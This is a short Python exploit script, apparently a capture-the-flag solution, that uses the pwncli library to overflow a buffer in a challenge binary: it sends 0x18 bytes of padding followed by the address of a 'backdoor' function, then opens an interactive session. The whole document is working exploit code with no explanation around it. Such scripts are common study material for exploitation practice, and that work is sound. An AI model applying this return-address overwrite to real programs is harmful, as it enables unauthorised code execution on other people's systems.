
#!/usr/bin/python3
# -*- encoding: utf-8 -*-

from pwncli import *

# use script mode
cli_script()

# get use for obj from gift
io: tube = gift['io']
elf: ELF = gift['elf']
libc: ELF = gift['libc']

#readelf -s prog|grep backdoor
backdoor=0x00000000004006ab

payload=b'a'*0x18+p64(backdoor)
sla('I\'ll only give you one chance.',payload)

ia()
